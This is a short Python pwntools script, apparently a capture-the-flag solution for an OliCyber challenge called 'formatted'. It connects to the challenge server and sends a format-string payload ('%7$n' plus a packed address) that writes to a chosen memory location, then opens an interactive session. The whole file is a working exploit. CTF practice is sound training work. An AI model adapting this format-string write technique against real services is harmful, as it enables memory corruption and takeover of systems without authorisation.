from pwn import *

URL="formatted.challs.olicyber.it"
r=remote(URL, 10305)
r.recv()
r.sendline(b'A%7$naaa'+p64(0x40404C))
r.recv()
r.interactive() 